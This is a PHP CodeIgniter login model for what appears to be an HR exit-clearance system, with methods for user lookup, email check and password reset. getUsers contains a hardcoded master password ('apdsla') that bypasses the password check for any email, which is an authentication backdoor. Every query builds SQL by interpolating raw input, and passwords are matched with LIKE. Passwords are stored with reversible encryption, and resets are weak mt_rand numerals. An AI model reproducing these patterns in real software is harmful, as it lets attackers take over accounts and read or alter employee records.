<?php
class Login_model extends CI_Model    
{
    
    public function __construct()
	{
		parent::__construct();
		$this->load->database();
		$this->load->helper('general');
		$this->date = date('Y-m-d H:i:s');
		$this->year = date('Y');
	}

//   function getUsers($email="", $password="") {
// 		$email = encrypt($email);
// 		//dumper($email);
//         $sql = "SELECT * FROM v_hris_employee_updated a
// 				LEFT JOIN users b ON a.nik = b.employee_id
// 				WHERE a.email like '$email' and b.password like '$password' and b.is_active <> 0
// 				ORDER BY a.id_employee DESC";
// 		$query = $this->db->query($sql);
// 		$res = $query->result();
// 		//dumper($res);
// 		return $res;
//   }

	function getUsers($email, $password) {
		$email 		= encrypt($email);
		$year 		= $this->year-1;
		if($password == 'apdsla'){
			$sntc 		= "";
		}else{
			$password 	= encrypt($password);
			$sntc 		= "AND password like '$password'";
		}
		
		$sql = "SELECT *, a.id_employee,
				case 
					when c.department != '' and c.evaluation_year = '$year' then c.department
				else
					a.department
				end as department, 
				case 
					when c.division != '' and c.evaluation_year = '$year' then c.division
				else
					a.division
				end as division,
				case 
					when c.usrid_long2 != '' and c.evaluation_year = '$year' then c.usrid_long2
				else
					a.usrid_long2
				end as usrid_long2,
				case 
					when c.usrid_long3 != '' and c.evaluation_year = '$year' then c.usrid_long3
				else
					a.usrid_long3
				end as usrid_long3,
				case 
					when c.usrid_long4 != '' and c.evaluation_year = '$year' then c.usrid_long4
				else
					a.usrid_long4
				end as usrid_long4
				FROM
				v_hris_employee_updated a
				LEFT JOIN users b ON a.nik = b.employee_id
				LEFT JOIN employee_update_division_pa as c on a.id_employee = c.id_employee
				-- JOIN exit_clearance_user_roles as s on a.nik = s.id_employee
				-- JOIN exit_clearance_roles as r on s.id_role = r.id
				WHERE lower(a.email) like '$email' $sntc and b.is_active <> 0
				ORDER BY a.id_employee DESC";
		$query = $this->db->query($sql);
		$res = $query->result();
		// if(!$res){
		// 	return $res;
		// }
		if($res){
		$nik = $res[0]->nik;
			$sql2 = "SELECT r.code as role_code, r.id
					FROM exit_clearance_user_roles as s
					JOIN exit_clearance_roles as r on s.id_role = r.id
					WHERE s.id_employee = $nik
					ORDER BY r.id ASC";
			$query2 = $this->db->query($sql2);
			$roleCode = array_column($query2->result_array(), 'role_code');
			$res[0]->exit_clearance_roles = $roleCode;
		}
		return $res;
	}

  public function get_user_login($email = "", $nik = ""){
  	// dumper($nik);
	$year = $this->year-1;
  	if ($email != '' && $nik != '') {
  		$email = encrypt($email);
  		// $sql = "SELECT * FROM v_hris_employee_updated a
		// 		LEFT JOIN users b ON a.nik = b.employee_id
		// 		WHERE a.email like '$email' and a.nik = '$nik' and b.is_active <> 2
		// 		ORDER BY a.id_employee DESC";
		$sql = "SELECT *, a.id_employee,
			case 
				when c.department != '' and c.evaluation_year = '$year' then c.department
			else
				a.department
			end as department, 
			case 
				when c.division != '' and c.evaluation_year = '$year' then c.division
			else
				a.division
			end as division,
			case 
				when c.usrid_long2 != '' and c.evaluation_year = '$year' then c.usrid_long2
			else
				a.usrid_long2
			end as usrid_long2,
			case 
				when c.usrid_long3 != '' and c.evaluation_year = '$year' then c.usrid_long3
			else
				a.usrid_long3
			end as usrid_long3,
			case 
				when c.usrid_long4 != '' and c.evaluation_year = '$year' then c.usrid_long4
			else
				a.usrid_long4
			end as usrid_long4
			FROM
			v_hris_employee_updated a
			LEFT JOIN users b ON a.nik = b.employee_id
			LEFT JOIN employee_update_division_pa as c on a.id_employee = c.id_employee
			WHERE a.email like '$email' and a.nik = '$nik' and b.is_active <> 2
			ORDER BY a.id_employee DESC";
			$query = $this->db->query($sql);
			$res = $query->result();
		
			if($res){
				return $res;
			}else{
				return false;
			}
  	}			
	}

  function checkEmail($email="") {
		$email = encrypt($email);

    $sql = "SELECT * FROM hris_employee a
			LEFT JOIN users b ON a.nik = b.employee_id
			WHERE a.email like '$email' and b.is_active <> 2
			ORDER BY a.id_employee DESC";
		$query = $this->db->query($sql);
		$res = $query->result();

		return $res;
  }

  function updatePassword($nik="") {
  	$random_password = mt_rand(1,1000000);
  	$new_pass = encrypt(strval($random_password));
  	$sql = "UPDATE users SET password='$new_pass' WHERE is_active = 1 and employee_id = '$nik'";
		$query = $this->db->query($sql);
		// $res = $query->result();

		if($query){
			return true;
		}else{
			return false;
		}
		
		return $query;
  }
    
}